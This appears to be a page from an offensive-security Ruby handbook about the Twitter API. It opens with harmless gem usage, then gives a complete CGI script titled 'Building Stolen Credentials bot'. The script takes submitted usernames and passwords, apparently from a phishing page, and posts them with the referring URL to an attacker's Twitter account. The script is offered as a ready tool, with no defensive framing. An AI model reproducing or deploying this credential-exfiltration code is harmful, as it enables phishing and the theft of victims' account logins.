# Twitter API

- To install twitter API
```
gem install twitter
```

## Basic Usage
```ruby
require 'twitter'
client = Twitter::REST::Client.new do |config|
        config.consumer_key        = "YOUR_CONSUMER_KEY"
        config.consumer_secret     = "YOUR_CONSUMER_SECRET"
        config.access_token        = "YOUR_ACCESS_TOKEN"
        config.access_token_secret = "YOUR_ACCESS_SECRET"
end


client.user("KINGSABRI")
client.update("w00t! #Rubyfu")      # Tweet (as the authenticated user)
client.follow("KINGSABRI")          # Follow User (as the authenticated user)
client.followers("KINGSABRI")       # Fetch followers of a user
client.followers                    # Fetch followers of current user 
client.status(649235138585366528)   # Fetch a particular Tweet by ID
```

## Building Stolen Credentials bot
Here's the idea, We'll make a CGI script
```ruby
#!/usr/bin/ruby -w                                                                 

require 'cgi'
require 'uri'
require 'twitter'

cgi  = CGI.new
puts cgi.header  # content type 'text/html'

user = CGI.escape cgi['user']
pass = CGI.escape cgi['pass']
time = Time.now.strftime("%D %T")

client = Twitter::REST::Client.new do |config|
        config.consumer_key        = "YOUR_CONSUMER_KEY"
        config.consumer_secret     = "YOUR_CONSUMER_SECRET"
        config.access_token        = "YOUR_ACCESS_TOKEN"
        config.access_token_secret = "YOUR_ACCESS_SECRET"
end
client.user("KINGSABRI")

if cgi.referer.nil? or cgi.referer.empty?
    # Twitter notification
    client.update("[Info] No Refere!\n" + "#{CGI.unescape user}:#{CGI.unescape pass}")
else
    client.update("[Info] #{cgi.referer}\n #{CGI.unescape user}:#{CGI.unescape pass}")
end

puts ""
```






[1]: http://rubyfu.net/content/module_0x4__web_kungfu/index.html#cgi